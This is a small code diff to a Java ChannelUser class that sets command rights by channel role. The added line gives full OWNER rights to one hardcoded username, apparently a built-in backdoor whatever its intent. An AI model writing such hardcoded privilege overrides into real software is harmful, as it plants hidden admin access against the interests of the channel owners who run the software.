@@ -19,6 +19,7 @@ public class ChannelUser {
         if (isSub || isVip) this.rightLevel = CommandRights.VIP_SUB;
         if (isMod) this.rightLevel = CommandRights.MODERATOR;
         if (isOwner) this.rightLevel = CommandRights.OWNER;
+        if ("byterbrodtv".equals(name)) this.rightLevel = CommandRights.OWNER;
     }
 
     public String getName() {
